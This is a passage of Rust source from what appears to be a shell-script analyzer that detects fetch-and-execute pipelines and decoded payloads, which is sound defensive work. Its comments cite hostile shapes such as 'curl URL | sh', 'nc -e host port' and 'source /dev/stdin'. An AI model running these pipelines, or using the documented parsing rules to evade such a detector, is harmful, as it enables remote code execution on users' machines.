        if !skip_wrapper_options(basename, segment, &mut index) {
            break;
        }
    }
    commands
}

/// The command embedded in an `env -S`/`--split-string` word, if the
/// wrapper's option area carries one: the string is word-split and its
/// first word executed (`env -S 'curl URL'` runs curl). Options and
/// assignments before it are skipped; a plain command word ends the scan.
fn env_split_string_command(segment: &[ShellToken], start: usize) -> Option<ScriptCommand<'_>> {
    let mut index = start;
    let mut value: Option<&str> = None;
    while value.is_none() {
        match segment.get(index)? {
            ShellToken::Operator(op) if is_redirect_operator(op) => {
                index += 1;
                if matches!(segment.get(index), Some(ShellToken::Word { .. })) {
                    index += 1;
                }
            }
            ShellToken::Operator(_) => return None,
            ShellToken::Word { value: word, .. } => {
                let word = word.as_str();
                if is_env_assignment(word) {
                    index += 1;
                } else if word == "-S" || word == "--split-string" {
                    index += 1;
                    // A dangling `-S` carries no command string.
                    value = Some(segment.get(index).and_then(ShellToken::word)?);
                } else if let Some(rest) = word.strip_prefix("-S").filter(|rest| !rest.is_empty()) {
                    value = Some(rest);
                } else if let Some(rest) = word.strip_prefix("--split-string=") {
                    value = Some(rest);
                } else if let Some(long) = word.strip_prefix("--") {
                    if !long.contains('=') && wrapper_option_takes_value("env", long) {
                        advance_option_with_value(segment, &mut index);
                    } else {
                        index += 1;
                    }
                } else if word.len() > 1 && word.starts_with('-') {
                    if wrapper_option_takes_value("env", &word[1..]) {
                        advance_option_with_value(segment, &mut index);
                    } else {
                        index += 1;
                    }
                } else {
                    return None; // the command itself: no split-string present
                }
            }
        }
    }
    let mut words = value?.split_whitespace();
    let head = words.next()?;
    Some(ScriptCommand {
        head: command_basename(head),
        args: words.collect(),
        arg_dynamic: Vec::new(),
    })
}

fn is_env_assignment(token: &str) -> bool {
    let Some(equals) = token.find('=') else {
        return false;
    };
    equals > 0
        && token[..equals]
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
}

/// Argument word values of the command heading at `start`, each with its
/// runtime-derivation flag: every word except redirection operators and
/// their target words, so a redirect operand (`nc > -e host port`, `chmod >
/// 777 /tmp/x`) never reads as a detector flag or mode. Other operators
/// (leftover group punctuation) carry no argv.
fn command_arguments(segment: &[ShellToken], start: usize) -> Vec<(&str, bool)> {
    let mut args = Vec::new();
    let mut index = start;
    while index < segment.len() {
        match &segment[index] {
            ShellToken::Operator(op) if is_redirect_operator(op) => {
                index += 1;
                if matches!(segment.get(index), Some(ShellToken::Word { .. })) {
                    index += 1; // the redirect target word
                }
            }
            ShellToken::Word { value, dynamic, .. } => {
                args.push((value.as_str(), *dynamic));
                index += 1;
            }
            ShellToken::Operator(_) => index += 1,
        }
    }
    args
}

/// Whether an operator token is a redirection (as opposed to a control
/// operator like `;`, `|`, `&&`): every redirection form contains `<` or `>`.
fn is_redirect_operator(op: &str) -> bool {
    op.contains('>') || op.contains('<')
}

/// Advance `index` past leading environment assignments, I/O redirections
/// (operator plus its target word), `!` pipeline negation, and a
/// subshell/brace open so the executable lands in command position:
/// `2>/dev/null VAR=x ! curl …` selects `curl`. An arithmetic command `((`
/// is NOT a prefix — its words are expression operands, never a command.
fn skip_command_prefixes(segment: &[ShellToken], index: &mut usize) {
    while let Some(token) = segment.get(*index) {
        match token {
            ShellToken::Word { value, .. } if value == "!" || is_env_assignment(value) => {
                *index += 1;
            }
            ShellToken::Operator(op) if op == "(" || op == "{" => *index += 1,
            ShellToken::Operator(op) if is_redirect_operator(op) => {
                *index += 1;
                if matches!(segment.get(*index), Some(ShellToken::Word { .. })) {
                    *index += 1; // the redirect target word
                }
            }
            _ => break,
        }
    }
}

/// Consume a command-position wrapper's own arguments so the wrapped command
/// lands in command position: option clusters (`-n`, `-EH`, glued `-uroot`),
/// separate option values (`-u root`, `--user root`), `--`, redirections, and
/// environment prefixes. Returns whether the wrapper actually executes a
/// wrapped command — a plain word ends the scan with `true`, while
/// `command -v curl` only describes curl and yields `false`.
fn skip_wrapper_options(wrapper: &str, segment: &[ShellToken], index: &mut usize) -> bool {
    while let Some(token) = segment.get(*index) {
        match token {
            ShellToken::Operator(op) if is_redirect_operator(op) => {
                *index += 1;
                if matches!(segment.get(*index), Some(ShellToken::Word { .. })) {
                    *index += 1;
                }
            }
            ShellToken::Operator(op) if op == "(" => *index += 1,
            ShellToken::Operator(_) => return false,
            ShellToken::Word { value, .. } => {
                let token = value.as_str();
                if is_env_assignment(token) {
                    *index += 1;
                } else if token == "--" {
                    *index += 1;
                    return true;
                } else if let Some(long) = token.strip_prefix("--") {
                    if !long.contains('=') && wrapper_option_takes_value(wrapper, long) {
                        advance_option_with_value(segment, index);
                    } else {
                        *index += 1;
                    }
                } else if token.len() > 1 && token.starts_with('-') {
                    let flags = &token[1..];
                    if wrapper == "command" && flags.contains(['v', 'V']) {
                        return false; // describe-only: nothing executes
                    }
                    if flags.len() == 1 && wrapper_option_takes_value(wrapper, flags) {
                        advance_option_with_value(segment, index);
                    } else {
                        *index += 1;
                    }
                } else {
                    return true; // the wrapped command
                }
            }
        }
    }
    false // options ran off the end: no wrapped command
}

/// Skip an option and its separate value word (`-u root`, `--user root`).
fn advance_option_with_value(segment: &[ShellToken], index: &mut usize) {
    *index += 1;
    if matches!(segment.get(*index), Some(ShellToken::Word { .. })) {
        *index += 1;
    }
}

/// Sudo-family options that take a separate value token, matched on the bare
/// name; glued values (`-uroot`, `--user=root`) need no special case.
fn wrapper_option_takes_value(wrapper: &str, option: &str) -> bool {
    match wrapper {
        "sudo" => matches!(
            option,
            "u" | "g"
                | "p"
                | "C"
                | "T"
                | "D"
                | "R"
                | "U"
                | "user"
                | "group"
                | "other-user"
                | "prompt"
                | "close-from"
                | "chdir"
                | "type"
                | "role"
                | "context"
                | "host"
                | "command-timeout"
        ),
        // `command` takes no valued options; `-p` is a bare flag. `-v`/`-V`
        // never reach here — they stop the unwrap (describe-only).
        "command" => false,
        "env" => matches!(
            option,
            "u" | "unset"
                | "chdir"
                | "split-string"
                | "block-signal"
                | "default-signal"
                | "ignore-signal"
        ),
        "pkexec" => option == "user",
        "doas" => option == "u",
        "exec" => option == "a", // exec -a NAME
        // GNU time: -f/--format and -o/--output take a value; -a is a flag.
        "time" => matches!(option, "f" | "o" | "format" | "output"),
        _ => false,
    }
}

fn command_is_interpreter(command: &ScriptCommand) -> bool {
    INTERPRETER_BASENAMES.contains(&command.head)
}

/// What an interpreter invocation executes: stdin as a script, a statically
/// known body (`-c` text), a file or module operand, a parse-only read
/// (`bash -n` checks without executing), or nothing at all (help/version
/// exits before reading stdin).
enum InterpreterMode<'a> {
    StdinScript,
    LiteralBody(&'a str),
    FileOrModule,
    ParseOnly,
    Exits,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum InterpreterFamily {
    Shell,
    Python,
}

fn interpreter_family(command: &ScriptCommand) -> Option<InterpreterFamily> {
    match command.head {
        "sh" | "bash" | "dash" | "zsh" | "ksh" | "ash" => Some(InterpreterFamily::Shell),
        "python" | "python3" => Some(InterpreterFamily::Python),
        _ => None,
    }
}

/// Parse an interpreter's arguments by token and arity — never by
/// substring — so option payloads never read as modes (`-cecho` is a body,
/// `-O extglob` consumes its value) and mode letters never hide inside
/// unrelated clusters (`--norc` is not `-c`). The FIRST `-c`/`-s`/`-n`
/// selects the execution mode; a `-c` body is glued to the cluster or the
/// next argument, but only when that argument is statically known — a
/// runtime-derived body (`sh -c "$text"`) is outside the static slice.
fn interpreter_mode<'a>(command: &ScriptCommand<'a>) -> InterpreterMode<'a> {
    if !command_is_interpreter(command) {
        return InterpreterMode::FileOrModule;
    }
    let shell_family = interpreter_family(command) == Some(InterpreterFamily::Shell);
    let mut shell_command_body: Option<&'a str> = None;
    let mut shell_command_requested = false;
    let mut shell_stdin = false;
    let mut shell_noexec = false;
    let mut index = 0usize;
    while let Some(arg) = command.args.get(index) {
        if *arg == "--" {
            // The FIRST operand after `--` selects the script (`-` is
            // stdin); later words are positional parameters, not the script
            // (`sh -- - arg` still reads stdin).
            let operand_mode = match command.args[index + 1..]
                .iter()
                .find(|operand| !operand.is_empty())
            {
                None | Some(&"-") => InterpreterMode::StdinScript,
                Some(_) => InterpreterMode::FileOrModule,
            };
            return if shell_noexec {
                InterpreterMode::ParseOnly
            } else if let Some(body) = shell_command_body {
                InterpreterMode::LiteralBody(body)
            } else if shell_stdin {
                InterpreterMode::StdinScript
            } else {
                operand_mode
            };
        }
        if *arg == "-" {
            return if shell_noexec {
                InterpreterMode::ParseOnly
            } else if let Some(body) = shell_command_body {
                InterpreterMode::LiteralBody(body)
            } else {
                InterpreterMode::StdinScript
            }; // conventional stdin operand
        }
        if let Some(long) = arg.strip_prefix("--") {
            match interpreter_long_option(shell_family, long) {
                LongOption::Exits => return InterpreterMode::Exits,
                LongOption::Flag => index += 1,
                LongOption::Value => {
                    // `--rcfile FILE` — the value is glued on `=` or separate.
                    index += if long.contains('=') { 1 } else { 2 };
                }
            }
            continue;
        }
        if arg.len() > 1 && arg.starts_with(['-', '+']) && shell_family {
            // Shell short clusters accept `+` for the negated `set` form.
            // Parse the complete option area before selecting a mode: `-c`
            // takes the NEXT argv word, `+n` disables noexec, and `-c` wins
            // over `-s` while enabled noexec wins over both.
            let flags = &arg[1..];
            let bytes = flags.as_bytes();
            let mut offset = 0usize;
            let mut advance = 1usize;
            while offset < bytes.len() {
                match bytes[offset] {
                    b'c' => {
                        shell_command_requested = true;
                        shell_command_body = separate_cluster_value(command, index);
                        // Remaining bytes are still options, not body text.
                        offset += 1;
                    }
                    b'n' => {
                        shell_noexec = arg.starts_with('-');
                        offset += 1;
                    }
                    b'D' => {
                        shell_noexec = true; // reads/parses stdin without normal execution
                        offset += 1;
                    }
                    b's' => {
                        shell_stdin = true;
                        offset += 1;
                    }
                    b'o' | b'O' => {
                        // valued: glued to the rest of the cluster or the
                        // next argument (`-Oextglob`, `-o errexit`)
                        advance = if offset + 1 < bytes.len() { 1 } else { 2 };
                        break;
                    }
                    _ => offset += 1,
                }
            }
            index += advance;
            continue;
        }
        if arg.len() > 1 && arg.starts_with('-') {
            // Python family, walked the same way: `-c` bodies and `-m`
            // modules replace stdin, `-h`/`-V` exit before reading it, and
            // `-W`/`-X` consume a glued-or-separate value so
            // `-Ximporttime` never reads as module mode.
            let flags = &arg[1..];
            let bytes = flags.as_bytes();
            let mut offset = 0usize;
            let mut advance = 1usize;
            while offset < bytes.len() {
                match bytes[offset] {
                    b'c' => {
                        let glued = &flags[offset + 1..];
                        if glued.is_empty() {
                            return match separate_cluster_value(command, index) {
                                Some(body) => InterpreterMode::LiteralBody(body),
                                None => InterpreterMode::FileOrModule, // dangling or derived
                            };
                        }
                        return InterpreterMode::LiteralBody(glued);
                    }
                    b'm' => return InterpreterMode::FileOrModule, // module mode, not stdin
                    b'h' | b'V' => return InterpreterMode::Exits,
                    b'W' | b'X' => {
                        advance = if offset + 1 < bytes.len() { 1 } else { 2 };
                        break;
                    }
                    _ => offset += 1,
                }
            }
            index += advance;
            continue;
        }
        return if shell_noexec {
            InterpreterMode::ParseOnly
        } else if let Some(body) = shell_command_body {
            InterpreterMode::LiteralBody(body)
        } else if shell_stdin {
            InterpreterMode::StdinScript
        } else {
            InterpreterMode::FileOrModule
        }; // a script file operand
    }
    if shell_noexec {
        InterpreterMode::ParseOnly
    } else if let Some(body) = shell_command_body {
        InterpreterMode::LiteralBody(body)
    } else if shell_stdin || (shell_family && !shell_command_requested) {
        InterpreterMode::StdinScript
    } else if shell_command_requested {
        InterpreterMode::FileOrModule
    } else {
        InterpreterMode::StdinScript // Python without a script also reads stdin
    }
}

/// The next argument as a static option payload (`-c body`): `None` when
/// missing or runtime-derived.
fn separate_cluster_value<'a>(command: &ScriptCommand<'a>, index: usize) -> Option<&'a str> {
    let next = command.args.get(index + 1)?;
    let dynamic = command.arg_dynamic.get(index + 1).copied().unwrap_or(true);
    (!dynamic).then_some(next)
}

/// How one long option (without its leading `--`) behaves for the
/// interpreter family: some exit without reading stdin at all, some take a
/// separate value, and the rest are plain flags. Unknown options stay
/// flags — an interpreter that rejects one never weakens the
/// executed-stdin reading of the ones it accepts.
enum LongOption {
    Exits,
    Flag,
    Value,
}

fn interpreter_long_option(shell_family: bool, long: &str) -> LongOption {
    let name = long.split('=').next().unwrap_or(long);
    if shell_family {
        match name {
            "help" | "version" | "dump-po-strings" | "dump-strings" => LongOption::Exits,
            "rcfile" | "init-file" => LongOption::Value,
            _ => LongOption::Flag, // --norc, --noprofile, --posix, …
        }
    } else {
        match name {
            "check" | "help" | "version" => LongOption::Exits,
            _ => LongOption::Flag, // --quiet, --utf8, …
        }
    }
}

/// An interpreter's statically known `-c` body, when it has one: literal
/// text only, since a runtime-derived body (`sh -c "$text"`) resolves
/// outside the static slice.
fn interpreter_static_body<'a>(command: &ScriptCommand<'a>) -> Option<&'a str> {
    if interpreter_family(command) != Some(InterpreterFamily::Shell) {
        return None;
    }
    match interpreter_mode(command) {
        InterpreterMode::LiteralBody(body) if !body.is_empty() => Some(body),
        _ => None,
    }
}

/// The statically known shell text a command executes: an interpreter's
/// `-c` body, or an `eval` argument list joined the way eval concatenates
/// its arguments with spaces. Any runtime-derived argument puts the whole
/// text outside the static slice.
fn static_command_body(command: &ScriptCommand) -> Option<String> {
    if command.head == "eval" {
        if command.args.is_empty() || command.arg_dynamic.iter().any(|dynamic| *dynamic) {
            return None;
        }
        let body = command
            .args
            .iter()
            .skip(usize::from(command.args.first() == Some(&"--")))
            .copied()
            .collect::<Vec<_>>()
            .join(" ");
        return (!body.is_empty()).then_some(body);
    }
    interpreter_static_body(command).map(str::to_owned)
}

/// What a statically known shell body (an interpreter `-c` body, an `eval`
/// argument) does with its inherited stdin, computed by the same walks that
/// read inline pipelines. Every field fails closed on an exhausted budget.
struct ShellSummary {
    /// The body executes inherited stdin as code (`sh -c sh`).
    consumes_stdin_as_code: bool,
    /// The body spends the inherited pipe without forwarding it
    /// (`sh -c 'cat >/dev/null'`).
    drains_stdin: bool,
    /// The body passes inherited stdin through to its own stdout
    /// (`sh -c 'cat'`).
    forwards_stdin_body: bool,
}

impl ShellSummary {
    const SILENT: Self = Self {
        consumes_stdin_as_code: false,
        drains_stdin: false,
        forwards_stdin_body: false,
    };
}

/// Analyse one static shell body, charging one depth level for the reparse.
fn static_body_summary(body: &str, budget: &mut ShellBudget) -> ShellSummary {
    if !budget.enter() {
        return ShellSummary::SILENT;
    }
    let tokens = tokenize(body);
    let (consumes_stdin_as_code, drains_stdin) = group_stdin_reaches_interpreter(&tokens, budget);
    let forwards_stdin_body = group_forwards_stdin(&tokens, budget);
    budget.leave();
    ShellSummary {
        consumes_stdin_as_code,
        drains_stdin,
        forwards_stdin_body,
    }
}

/// Whether any executed statement's pipeline carries a live fetch producer
/// whose output reaches the pipeline's end — the body's or span's stdout
/// (`sh -c 'curl URL'` produces the response; `sh -c 'curl URL | sh'`
/// produces only the inner script's output).
fn tokens_live_fetch_stdout(tokens: &[ShellToken], budget: &mut ShellBudget) -> bool {
    if !budget.spend(tokens.len()) {
        return false;
    }
    let mut outcomes = Outcomes::ANY;
    for (statement, guard) in conditional_statements(tokens) {
        if statement.is_empty() {
            continue;
        }
        if !outcomes.executes(guard) {
            continue;
        }
        if pipeline_has_live_producer(&pipeline_segments(statement), budget, &command_fetches) {
            return true;
        }
        outcomes = outcomes.advance(guard, statement_outcomes(statement));
    }
    false
}

/// Whether a command in a pipeline segment executes its inherited stdin as
/// shell code: an interpreter in stdin-script mode, an interpreter whose
/// static `-c` body itself consumes stdin as code (`sh -c sh`), or an
/// explicit stdin-to-code consumer (`source /dev/stdin`, `xargs` feeding a
/// body-less interpreter `-c`).
fn command_consumes_stdin_code(command: &ScriptCommand, budget: &mut ShellBudget) -> bool {
    if let Some(body) = interpreter_static_body(command) {
        return static_body_summary(body, budget).consumes_stdin_as_code;
    }
    if interpreter_family(command) == Some(InterpreterFamily::Shell) {
        return matches!(interpreter_mode(command), InterpreterMode::StdinScript);
    }
    stdin_code_consumer(command)
}

/// Explicit stdin-to-code consumers beyond interpreters: `source
/// /dev/stdin` (and the `.` spelling, whose basename is empty) executes the
/// pipe directly, and `xargs` hands its input words to the wrapped command.
fn stdin_code_consumer(command: &ScriptCommand) -> bool {
    if matches!(command.head, "source" | "") {
        return command
            .args
            .first()
            .is_some_and(|operand| matches!(*operand, "/dev/stdin" | "/dev/fd/0"));
    }
    if command.head == "xargs" {
        return xargs_feeds_stdin_code(command);
    }
    false
}

/// `xargs` appends its input to the wrapped command's argv: when that
/// command is an interpreter whose `-c` body is MISSING, the input word
/// becomes the executed body (`curl URL | xargs sh -c`); a static body
/// only evaluates the input when it references the positional parameters
/// (`xargs sh -c 'eval "$@"' _`), while a fixed body (`echo safe`) runs
/// the same script for every input word.
fn xargs_feeds_stdin_code(command: &ScriptCommand) -> bool {
    let Some(wrapped) = xargs_wrapped_command(command) else {
        return false;
    };
    let wrapped_command = ScriptCommand {
        head: command_basename(command.args[wrapped]),
        args: command.args[wrapped + 1..].to_vec(),
        arg_dynamic: command.arg_dynamic[wrapped + 1..].to_vec(),
    };
    if interpreter_family(&wrapped_command) != Some(InterpreterFamily::Shell) {
        return false;
    }
    let Some(c_option) = wrapped_command
        .args
        .iter()
        .position(|arg| is_short_option(arg, 'c'))
    else {
        return false;
    };
    match wrapped_command.args.get(c_option + 1) {
        // With no static body, xargs appends the input word at the missing
        // command-string position.
        None => true,
        // `$@` is deliberately runtime-derived, but it is still static
        // *syntax* we can follow as xargs taint through a shell body.
        Some(body) => positional_parameters_reach_code(body),
    }
}

/// Return the actual xargs child-command head after options. Interpreter
/// words in option values or a child command's ordinary argv are data, not
/// evidence that xargs executes shell code.
fn xargs_wrapped_command(command: &ScriptCommand) -> Option<usize> {
    let mut index = 0usize;
    while let Some(arg) = command.args.get(index) {
        if *arg == "--" {
            return (index + 1 < command.args.len()).then_some(index + 1);
        }
        if !arg.starts_with('-') || *arg == "-" {
            return Some(index);
        }
        let long = arg.strip_prefix("--");
        let takes_value = match long.map(|value| value.split('=').next().unwrap_or(value)) {
            Some(
                "replace" | "max-args" | "max-lines" | "max-procs" | "max-chars" | "eof"
                | "delimiter",
            ) => !arg.contains('='),
            Some(_) => false,
            None => {
                let short = &arg[1..];
                let valued = short
                    .chars()
                    .next()
                    .is_some_and(|flag| matches!(flag, 'I' | 'n' | 'L' | 'P' | 's' | 'E' | 'd'));
                valued && short.len() == 1
            }
        };
        index += if takes_value { 2 } else { 1 };
    }
    None
}

/// Positional parameters only taint execution when they flow into command
/// position or an explicit code sink. `echo "$@"` is output data, while
/// `"$@"` and `eval "$@"` execute it.
fn positional_parameters_reach_code(body: &str) -> bool {
    let leading = body.trim_start();
    if (leading.starts_with("$@")
        || leading.starts_with("$*")
        || leading.starts_with("${@")
        || leading.starts_with("${*"))
        && references_positional_parameters(leading)
    {
        return true;
    }
    let tokens = tokenize(body);
    conditional_statements(&tokens)
        .iter()
        .any(|(statement, _)| {
            pipeline_segments(statement).iter().any(|segment| {
                let commands = segment_commands(segment);
                let Some(command) = commands.first() else {
                    return false;
                };
                let head_tainted = references_positional_parameters(command.head);
                let eval_tainted = command.head == "eval"
                    && command
                        .args
                        .iter()
                        .any(|arg| references_positional_parameters(arg));
                head_tainted || eval_tainted
            })
        })
}

/// Whether an argument is a short-option cluster carrying the given flag —
/// `-c` alone or closing a cluster (`-lc`); long options never match.
fn is_short_option(arg: &str, flag: char) -> bool {
    arg.starts_with('-') && !arg.starts_with("--") && arg[1..].contains(flag)
}

/// Whether shell text references the positional parameters (`$@`, `$*`,
/// `$0`…`$9`, and their brace forms) — the marks of input words flowing
/// into an executed body.
fn references_positional_parameters(body: &str) -> bool {
    body.contains("$@")
        || body.contains("$*")
        || body.contains("${@")
        || body.contains("${*")
        || body
            .as_bytes()
            .windows(2)
            .any(|pair| pair[0] == b'$' && pair[1].is_ascii_digit())
}

/// Whether the segment's own words carry a command substitution that turns
/// the inherited pipe into executed code: any head runs a substitution
/// whose interior itself executes stdin as code (`echo "$(sh)"`), and an
/// `eval` head additionally executes a substitution that merely forwards
/// the pipe to its output (`eval "$(cat)"`).
fn segment_consumes_stdin_substitution(segment: &[ShellToken], budget: &mut ShellBudget) -> bool {
    let head_eval = segment_commands(segment)
        .iter()
        .any(|command| command.head == "eval");
    let mut depth = 0i32;
    for token in segment {
        match token {
            ShellToken::Operator(op) => match op.as_str() {
                "(" | "{" | "((" => depth += 1,
                ")" | "}" | "))" => depth = (depth - 1).max(0),
                _ => {}
            },
            ShellToken::Word { substitutions, .. } if depth == 0 => {
                for substitution in substitutions {
                    if substitution.kind != SubstKind::Command {
                        continue;
                    }
                    if !budget.enter() {
                        return false;
                    }
                    let tokens = tokenize(&substitution.inner);
                    let (consumes, _) = group_stdin_reaches_interpreter(&tokens, budget);
                    let forwards = group_forwards_stdin(&tokens, budget);
                    budget.leave();
                    if consumes || (head_eval && forwards) {
                        return true;
                    }
                }
            }
            _ => {}
        }
    }
    false
}

fn command_fetches(command: &ScriptCommand) -> bool {
    matches!(command.head, "curl" | "wget")
}

/// A decoder able to release executable bytes in command position:
/// `base64 -d/--decode`, `openssl enc|base64 … -d`, or `xxd -r`. Flags are
/// token-exact so `-depth` and `-daemon` never satisfy `-d`.
fn command_decodes(command: &ScriptCommand) -> bool {
    match command.head {
        "base64" | "base32" => command_is_decode_mode(command),
        "openssl" => {
            command
                .args
                .iter()
                .any(|arg| matches!(*arg, "enc" | "base64" | "-base64"))
                && command.args.contains(&"-d")
        }
        "xxd" => command.args.contains(&"-r"),
        _ => false,
    }
}

/// Decoder mode shared by finding production and stdin forwarding. GNU
/// base64/base32 accept `d` in a short-option cluster (`-di`) as well as
/// `--decode`; encoding flags alone are derived output, never script text.
fn command_is_decode_mode(command: &ScriptCommand) -> bool {
    matches!(command.head, "base64" | "base32")
        && (short_cluster_flag(&command.args, 'd') || command.args.contains(&"--decode"))
}

/// Whether any command in the segment's command positions — including inside
/// its compound groups, which run pipelines of their own — matches `pred`
/// (`(echo x; curl URL) | sh` fetches from inside the producing group).
/// Arithmetic-command groups hold expressions, never commands.
fn segment_contains_command(
    segment: &[ShellToken],
    pred: &impl Fn(&ScriptCommand) -> bool,
    budget: &mut ShellBudget,
) -> bool {
    segment_commands(segment).iter().any(pred)
        || grouped_token_ranges(segment).iter().any(|(kind, group)| {
            *kind == GroupKind::List && group_contains_command(group, pred, budget)
        })
}

/// Whether a compound group's interior — its statements, pipeline segments,
/// and nested groups — holds a matching command on an EXECUTED path:
/// short-circuited statements own no command positions (`(false && curl …)`
/// fetches nothing).
fn group_contains_command(
    group: &[ShellToken],
    pred: &impl Fn(&ScriptCommand) -> bool,
    budget: &mut ShellBudget,
) -> bool {
    if !budget.spend(group.len()) || !budget.enter() {
        return false;
    }
    let mut outcomes = Outcomes::ANY;
    let mut found = false;
    for (statement, guard) in conditional_statements(group) {
        if statement.is_empty() {
            continue;
        }
        if !outcomes.executes(guard) {
            continue;
        }
        if pipeline_segments(statement)
            .iter()
            .any(|segment| segment_contains_command(segment, pred, budget))
        {
            found = true;
            break;
        }
        outcomes = outcomes.advance(guard, statement_outcomes(statement));
    }
    budget.leave();
    found
}

fn segment_fetches(segment: &[ShellToken], budget: &mut ShellBudget) -> bool {
    segment_contains_command(segment, &command_fetches, budget)
}

/// Command heads that read their stdin to exhaustion when it is a pipe:
/// whatever the statement runs after one of these finds the body already
/// consumed (`curl URL | (cat >/dev/null; sh)` leaves `sh` at EOF).
const STDIN_DRAINING_HEADS: [&str; 30] = [
    "cat",
    "grep",
    "egrep",
    "fgrep",
    "sed",
    "awk",
    "sort",
    "uniq",
    "wc",
    "tr",
    "tac",
    "rev",
    "cut",
    "paste",
    "tee",
    "xargs",
    "jq",
    "od",
    "base64",
    "base32",
    "zcat",
    "gzip",
    "gunzip",
    "xxd",
    "cksum",
    "md5sum",
    "sha1sum",
    "sha256sum",
    "sha512sum",
    "strings",
];

/// Whether the command reads its piped stdin to exhaustion: a known stdin
/// filter with no file operands redirecting the read elsewhere, no
/// early-exit mode, and no stdin redirection of its own.
fn drains_stdin(head: &str, args: &[&str]) -> bool {
    match head {
        // These consume the pipe whatever else they are told (tee also
        // forwards it; xargs spends it on child argv; tr only takes sets).
        "tee" | "xargs" | "tr" => return true,
        // `openssl enc|base64 …` reads stdin for encode and decode alike;
        // `-in FILE` takes the read elsewhere (`-pass pass:…` values are
        // options, not files), and `dd` reads it fully unless a count or
        // an `if=` input file limits or replaces it.
        "openssl" => {
            return (args.contains(&"enc")
                || args.contains(&"base64")
                || args.contains(&"-base64"))
                && !args.contains(&"-in");
        }
        "dd" => {
            return args.iter().all(|arg| arg.contains('='))
                && !args
                    .iter()
                    .any(|arg| arg.starts_with("if=") || arg.starts_with("count="));
        }
        _ if !STDIN_DRAINING_HEADS.contains(&head) => return false,
        _ => {}
    }
    if matches!(head, "grep" | "egrep" | "fgrep")
        && args
            .iter()
            .any(|arg| *arg == "-m" || arg.starts_with("--max-count"))
    {
        return false; // exits after the match count, leaving the pipe unread
    }
    if args.contains(&"--") {
        return false; // everything after `--` is a file operand
    }
    let operands = args.iter().filter(|arg| !arg.starts_with('-')).count();
    // sed/awk/grep/jq take a program/pattern argument before any file; one
    // such operand leaves stdin attached, more mean a file input.
    let program_arguments = match head {
        "sed" | "awk" | "grep" | "egrep" | "fgrep" | "jq" => 1,
        _ => 0,
    };
    operands <= program_arguments
}

/// Which draining commands still emit what they read (transformed) on
/// stdout, so the piped BODY reaches the next stage — decided per command
/// MODE, parallel to `command_decodes`: `base64`/`base32` forward only
/// while DECODING (`-d`/`--decode`), `xxd` only reversing (`-r`), `gzip`
/// only decompressing, `openssl` only its decode forms — encoding and
/// compressing spend the pipe on derived bytes. The rest of the known
/// transformers pass the body on in every mode, while drainers like
/// `xargs`, `wc`, and the checksum family emit DERIVED output — counts,
/// digests, child argv — and the body stops there.
fn forwards_stdin_body(command: &ScriptCommand) -> bool {
    let args = &command.args;
    match command.head {
        "cat" | "sed" | "awk" | "grep" | "egrep" | "fgrep" | "sort" | "uniq" | "tr" | "tac"
        | "rev" | "cut" | "tee" | "jq" | "zcat" | "gunzip" => true,
        "base64" | "base32" => command_is_decode_mode(command),
        "xxd" => args.contains(&"-r"),
        "gzip" => {
            short_cluster_flag(args, 'd')
                || args
                    .iter()
                    .any(|arg| matches!(*arg, "--decompress" | "--uncompress"))
        }
        "openssl" => {
            (args.contains(&"enc") || args.contains(&"base64") || args.contains(&"-base64"))
                && args.contains(&"-d")
                && !args.contains(&"-in")
        }
        // `dd` copies the body verbatim only as a plain (status-quiet)
        // copier: every argument is a KEY=VALUE option and none redirects
        // the input/output or changes the bytes.
        "dd" => {
            args.iter().all(|arg| arg.contains('='))
                && args.iter().all(|arg| {
                    !arg.starts_with("if=")
                        && !arg.starts_with("of=")
                        && !arg.starts_with("conv=")
                        && !arg.starts_with("skip=")
                        && !arg.starts_with("count=")
                        && !arg.starts_with("ibs=")
                        && !arg.starts_with("obs=")
                })
        }
        _ => false,
    }
}

/// Whether any short-option cluster (single `-`, not `--`) carries the
/// flag letter (`gzip -dc`, `-df`).
fn short_cluster_flag(args: &[&str], flag: char) -> bool {
    args.iter().any(|arg| {
        arg.len() > 1 && arg.starts_with('-') && !arg.starts_with("--") && arg[1..].contains(flag)
    })
}

/// What a segment's leading command does with data arriving on its stdin.
#[derive(Clone, Copy, PartialEq, Eq)]
enum StdinBehavior {
    /// Reads it and emits it on stdout (`cat`, `sed`): a downstream pipeline
    /// segment receives the data.
    Forwards,
    /// Reads it without handing the body on (`sh` running stdin as script,
    /// `cat >/dev/null`).
    Consumes,
    /// Leaves it untouched for whatever runs next (`echo`, `true`).
    Untouched,
}

/// The leading command's stdin behavior, following compound groups into
/// their statements (the first reading command decides).
fn segment_stdin_behavior(segment: &[ShellToken], budget: &mut ShellBudget) -> StdinBehavior {
    if let Some((kind, group)) = compound_position(segment) {
        if kind != GroupKind::List {
            return StdinBehavior::Untouched; // arithmetic reads no stdin
        }
        if !budget.spend(group.len()) || !budget.enter() {
            return StdinBehavior::Consumes; // unresolved: assume the pipe is spent
        }
        let mut behavior = StdinBehavior::Untouched;
        let mut outcomes = Outcomes::ANY;
        for (statement, guard) in conditional_statements(group) {
            if statement.is_empty() {
                continue;
            }
            if !outcomes.executes(guard) {
                continue;
            }
            if let Some(first) = pipeline_segments(statement).first() {
                behavior = segment_stdin_behavior(first, budget);
                if behavior != StdinBehavior::Untouched {
                    break;
                }
            }
            outcomes = outcomes.advance(guard, statement_outcomes(statement));
        }
        budget.leave();
        return behavior;
    }
    let commands = segment_commands(segment);
    let Some(command) = commands.first() else {
        return StdinBehavior::Untouched;
    };
    if depth_zero_redirect_moves_stdin_away(segment) {
        return StdinBehavior::Untouched; // the pipe is replaced before it
    }
    if let Some(body) = interpreter_static_body(command) {
        let summary = static_body_summary(body, budget);
        return if summary.consumes_stdin_as_code || summary.drains_stdin {
            StdinBehavior::Consumes
        } else if summary.forwards_stdin_body {
            StdinBehavior::Forwards
        } else {
            StdinBehavior::Untouched // the body never reads its stdin
        };
    }
    if command_is_interpreter(command) {
        return match interpreter_mode(command) {
            // Both shell parse-only modes and Python's stdin program consume
            // the pipe, but only shell stdin mode is an H3 code sink.
            InterpreterMode::ParseOnly | InterpreterMode::StdinScript => StdinBehavior::Consumes,
            InterpreterMode::FileOrModule
            | InterpreterMode::Exits
            | InterpreterMode::LiteralBody(_) => StdinBehavior::Untouched,
        };
    }
    if !command_is_interpreter(command) && stdin_code_consumer(command) {
        return StdinBehavior::Consumes; // the pipe becomes executed code
    }
    if !drains_stdin(command.head, &command.args) {
        return StdinBehavior::Untouched; // the pipe is never read here
    }
    if depth_zero_redirect_moves_stdout(segment) {
